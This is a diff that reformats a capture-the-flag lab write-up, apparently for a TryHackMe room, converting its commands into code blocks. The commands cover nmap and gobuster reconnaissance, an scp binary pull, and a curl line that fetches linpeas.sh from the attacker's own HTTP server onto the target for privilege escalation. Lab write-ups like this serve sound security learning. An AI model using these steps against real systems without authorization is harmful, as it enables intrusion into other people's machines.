@@ -9,17 +9,14 @@ Overview: This room is really interesting has you are going to exploit diferent 
 We start enumerating the machine by running nmap. 
 
 Nmap is a free and open source utility for network discovery and security auditing. With this tool we can search for open ports on a target machine.
-
-**nmap -sV -sC -p- 10.10.189.225 -oN nmap.txt**
+```
+nmap -sV -sC -p- 10.10.189.225 -oN nmap.txt
 
 -sV    →  Probe open ports to determine service
-
 -sC    →  Scan using the default set of scripts
-
 -p-    →  Scan all ports
-
 -oN    →  Save the ouput of the scan in a file
-
+```
 ![nmap](https://user-images.githubusercontent.com/76821053/120692473-b7f40980-c49f-11eb-982b-ebe00cb8f77a.png)
 
 There are two open ports on the system:
@@ -33,17 +30,14 @@ Since there is a http server running on the system we can take a look at it:
 ![httphome](https://user-images.githubusercontent.com/76821053/120692565-d78b3200-c49f-11eb-8ead-c1b985a7d705.png)
 
 After searching the webpage and its source code page i found nothing. So there is a tool called “Gobuster” which can help us search for hidden directories or files in http servers:
-
-**gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --url http://10.10.189.225 -x .txt,.cgi,.php,.log,.bak,.xxx,.old**
+```
+gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --url http://10.10.189.225 -x .txt,.cgi,.php,.log,.bak,.xxx,.old
 
 dir             → Uses directory/file enumeration mode
-
 --wordlist      → Path to wordslist 
-
 --url           → specifies the path of the target url we want to find any hidden directories
-
 -x              → Search for all files with the specified extentions 
-
+```
 ![gobuster_r](https://user-images.githubusercontent.com/76821053/120692664-fc7fa500-c49f-11eb-8f64-f80ed0af4e7b.png)
 
 We found a new directory:
@@ -131,9 +125,9 @@ To transfer the file to our system we need to change “rabbit” home directory
 ![chmod_rabbit](https://user-images.githubusercontent.com/76821053/120694580-4ff2f280-c4a2-11eb-8107-e1065ce3a692.png)
 
 From our machine we can run "scp" to download the file:
-
-**scp alice@10.10.189.225:/home/rabbit/teaParty .**
-
+```
+scp alice@10.10.189.225:/home/rabbit/teaParty .
+```
 ![scp](https://user-images.githubusercontent.com/76821053/120694668-65681c80-c4a2-11eb-834b-15c31407b75f.png)
 
 Now we gonna analyse the binary with "strings":
@@ -167,15 +161,15 @@ we can use a tool called "[linpeas.sh](https://github.com/carlospolop/privilege-
 Now to upload the tool to the target system we need to started a python http server and use curl.
 
 On our machine we setup the server where we host the “linpeas.sh” script:
-
-**python -m SimpleHTTPServer**
-
+```
+python -m SimpleHTTPServer
+```
 ![python_http](https://user-images.githubusercontent.com/76821053/120695863-c2180700-c4a3-11eb-85ee-d2251510af65.png)
 
 From the target machine we will use curl:
-
-**curl http://yourmachineip:8000/linpeas.sh -o linpeas.sh**
-
+```
+curl http://yourmachineip:8000/linpeas.sh -o linpeas.sh
+```
 ![curl_linpeas](https://user-images.githubusercontent.com/76821053/120695950-dcea7b80-c4a3-11eb-9a9c-44494c7f634c.png)
 
 We need to make “linpeas.sh” executable:
